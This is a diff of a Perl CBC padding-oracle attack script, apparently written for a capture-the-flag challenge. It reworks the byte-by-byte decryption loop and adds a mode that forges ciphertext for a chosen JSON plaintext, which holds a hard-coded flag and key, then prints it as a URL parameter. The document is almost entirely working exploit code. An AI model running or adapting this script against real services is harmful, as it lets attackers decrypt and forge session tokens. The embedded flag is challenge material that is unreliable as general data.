@@ -80,49 +80,70 @@ if ($encrypt == 1){ # Decode a cipher text using a cbc padding oracle
     
     #Padding length
     my $tempPARM = $parm; $it = 6; my $currentB = $qLen-($bSize+$it);
-substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
-my $return = getRequest($tempPARM); my $limit = 0;
-if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = $bSize+1;} # Make sure this works with other block sizes
-while ($it < $limit){
-    $tempPARM = $parm;
-    $currentB = $qLen-($bSize+$it);
     substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
-    $return = getRequest($tempPARM);
-    if ($return == 1){ # Test  if using a ($return) statment works
-        if ($it == 0){ $AIM = 0; }
-        else{ 
-            $tempPARM = $parm; $it--; $currentB = $qLen-($bSize+$it);
-            substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
-            $return = getRequest($tempPARM);
-            if ($return == 1){ $AIM = $it; }
-            else{ $AIM = $it+1; }}
-        last;
-    }else{ $it = $it + 2; }}
+    my $return = getRequest($tempPARM); my $limit = 0;
+    if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = $bSize+1;} # Make sure this works with other block sizes
+    while ($it < $limit){
+        $tempPARM = $parm;
+        $currentB = $qLen-($bSize+$it);
+        substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
+        $return = getRequest($tempPARM);
+        if ($return == 1){ # Test  if using a ($return) statment works
+            if ($it == 0){ $AIM = 0; }
+            else{ 
+                $tempPARM = $parm; $it--; $currentB = $qLen-($bSize+$it);
+                substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
+                $return = getRequest($tempPARM);
+                if ($return == 1){ $AIM = $it; }
+                else{ $AIM = $it+1; }}
+            last;
+        }else{ $it = $it + 2; }}
 
-if ($it == $bSize+2){ $AIM = $bSize; }
+    if ($it == $bSize+2){ $AIM = $bSize; }
 
-my $ill = 0;
-while ($ill < $AIM){
-    push @text, $AIM;
-    $ill++;
-}
+    my $ill = 0;
+    while ($ill < $AIM){
+        push @text, $AIM;
+        $ill++;
+    }
     #my $truAIM = $AIM;
-# $AIM equals the amount of padding
+    # $AIM equals the amount of padding
     print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
-#
-while ($bt < $bNum-1){ # fix jank fix
-    $target = $AIM+1, $it = $AIM;
-    while($it < $bSize){ findByte(); 
+    #
+    while ($bt < $bNum-1){ # fix jank fix
+        $target = $AIM+1, $it = $AIM;
+        while($it < $bSize){ findByte(); 
             my $tempP = "="x(($it+1)*5)." "x(($bSize-($it+1))*5); printf ("\r%d/%d {%s}",1+$it, $bSize, $tempP); 
             $it++; }
-    printf ("\rBlock %d/%d Complete                                                                          \n", 1+$bt, $bNum);
-    $qLen = $qLen-$bSize;
-    $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
-    $bt++;
-    $AIM = 0;
+        printf ("\rBlock %d/%d Complete                                                                          \n", 1+$bt, $bNum);
+        $qLen = $qLen-$bSize;
+        $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
+        $bt++;
+        $AIM = 0;
         printPlain(); }
-print "Attack Complete! Your plain text: \n";
+    print "Attack Complete! Your plain text: \n";
     printPlain(); }
+elsif ($encrypt == 0){ # Encode some plain text using a cbc padding oracle
+    my $plain = '{"flag": "^FLAG^d873f0bcb825f07762d49a0b93786324b26c2eeeb51c3191d212e44ab4670083$FLAG$", "id": "1", "key": "1XpvHA0onZ2cKIv6L9rCjg~~"}'."\n\n\n\n\n\n\n\n\n\n"; # auto add padding
+    #my $plain = 'e';
+    my @aPlain = ();
+    my $lPlain =  length($plain)-1;
+    my $bNum = ($lPlain+1)/$bSize;
+    print "bNum: $bNum\n";
+    foreach my $n ( 0 .. $lPlain ){ push @aPlain, substr($plain, $n, 1) }
+    local @currentC = (), local @finalPARM = (), local @IV = ();
+    foreach my $n ( 0 .. $bSize-1 ){ push @IV, chr(int(rand(127))); } # generate a random IV
+    foreach my $n ( 0 .. $bSize-1 ){ push @currentC, chr(int(rand(127))); } # generate a random initial C
+    $qLen = 31; # temp
+    genPARM();
+    for ( my $n = 0; $n < $bNum; $n++ ){
+        for ( my $n = $bSize-1; $n != -1; $n-- ){ unshift @currentC, chr(ord($IV[$n])^(shift @text)^ord((pop @aPlain))); }
+        genPARM(); }
+    my $heel = join ("", @finalPARM);
+    $heel = encode_base64($heel, '');
+    if ( $URLEncoding == 1 ){ $heel = uri_escape($heel); }
+    elsif ( $URLEncoding == 2) { $heel =~ s/\+/-/ig; $heel =~ s/\//!/ig; $heel =~ s/=/~/ig; }
+    print $url.$heel."\n"; }
 
 sub prep { # Preps padding for bit flipping (turns padding from something like \x03\x03\x03 to \x04\x04\x04)
     my $tilAIM = 0;
@@ -187,3 +208,12 @@ sub printPlain { # Print plain text as acsii and hex (more encodings and options
         printf("0x%02X | ", $_);
         $iter++; } 
     print "\n\n"; }
+
+sub genPARM {
+        $parm = join ("", @IV, @currentC); # Combine and transform the arrays to a string
+        print length($parm)."\n"; print scalar(@currentC)."\n"; # change this to percentage of progress
+        $AIM = 0, $target = 1;
+        foreach my $n ( 0 .. $bSize-1 ){ $it = $n; findByte(); }# why can't $it change it with loop?
+        unshift @finalPARM, @currentC;
+        @currentC = ();
+}
